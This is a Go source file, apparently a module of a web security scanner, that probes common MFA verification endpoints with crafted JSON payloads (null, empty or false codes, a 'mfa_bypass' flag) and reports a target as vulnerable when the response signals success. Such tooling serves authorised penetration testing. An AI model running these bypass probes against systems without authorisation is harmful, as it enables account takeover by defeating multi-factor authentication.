package core

import (
	"bytes"
	"context"
	"fmt"
	"net/http"
	"strings"
	"sync"
	"time"
)

type MFABypassResult struct {
	Target string `json:"target"`
	Status string `json:"status"`
	Detail string `json:"detail,omitempty"`
}

type MFABypass struct {
	BaseModule
	Target  string
	results []MFABypassResult
}

func NewMFABypass(target string) *MFABypass {
	return &MFABypass{
		BaseModule: BaseModule{
			Client:     NewHTTPClient(10 * time.Second),
			MaxThreads: 5,
		},
		Target: EnsureHTTPPrefix(target),
	}
}

func (m *MFABypass) Execute(ctx context.Context) ([]MFABypassResult, error) {
	m.results = make([]MFABypassResult, 0)

	endpoints := []string{
		"/api/mfa/verify",
		"/mfa/verify",
		"/login/mfa",
		"/2fa/verify",
	}

	payloads := []string{
		`{"code": null}`,
		`{"code": ""}`,
		`{"code": false}`,
		`{"mfa_bypass": true}`,
		`{}`,
	}

	var wg sync.WaitGroup
	jobs := make(chan string, len(endpoints))
	for _, ep := range endpoints {
		jobs <- ep
	}
	close(jobs)

	for i := 0; i < m.MaxThreads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for ep := range jobs {
				select {
				case <-ctx.Done():
					return
				default:
					for _, p := range payloads {
						m.testMFA(ctx, ep, p)
					}
				}
			}
		}()
	}

	wg.Wait()
	if len(m.results) == 0 {
		m.Mu.Lock()
		m.results = append(m.results, MFABypassResult{
			Target: m.Target,
			Status: "inconclusive",
			Detail: "No MFA endpoint confirmed a code-verification bypass on tested payloads.",
		})
		m.Mu.Unlock()
	}
	return m.results, nil
}

func (m *MFABypass) testMFA(ctx context.Context, endpoint, payload string) {
	testURL := m.Target + endpoint

	req, err := http.NewRequestWithContext(ctx, "POST", testURL, bytes.NewBufferString(payload))
	if err != nil {
		return
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := m.Client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	bodyBytes, _ := ReadBoundedBody(resp.Body, MaxResponseBodyBytes)
	normalized := normalizedCompactLower(string(bodyBytes))

	// Require an exact positive JSON signal (200/201) with the payload accepted,
	// keeping the failure exclusion. Loose substrings such as "success" or
	// "token" alone match failure bodies and CSRF-bearing HTML forms. The
	// negative check runs against the same normalized body as the positives and
	// also covers failure-shaped token values ("token":"expired" and friends).
	positiveSignal := strings.Contains(normalized, `"success":true`) ||
		strings.Contains(normalized, `"authenticated":true`) ||
		strings.Contains(normalized, `"token":"`)
	negativeSignal := containsAnyToken(normalized, []string{
		"failed", "invalid", "expired", "denied", "rejected", "revoked", "error",
	})

	if (resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusCreated) &&
		positiveSignal && !negativeSignal {

		m.Mu.Lock()
		m.RecordPoC(req, []byte(payload), fmt.Sprintf("Potential MFA Bypass at: %s", testURL))
		m.results = append(m.results, MFABypassResult{
			Target: m.Target,
			Status: "vulnerable",
			Detail: fmt.Sprintf("MFA bypassed or ignored with payload: %s at %s", payload, testURL),
		})
		m.Mu.Unlock()
	}
}

func init() {
	RegisterModule("mfa_bypass_testing", func(payload map[string]any, onLog func(string)) (ExecutableModule, error) {
		target := PayloadString(payload, "url", "")
		onLog(fmt.Sprintf("Starting MFABypass on: %s", target))
		tester := NewMFABypass(target)
		return ModuleWrapper{
			Module: tester,
			ExecuteFunc: func(ctx context.Context) (any, error) {
				return tester.Execute(ctx)
			},
		}, nil
	})
}
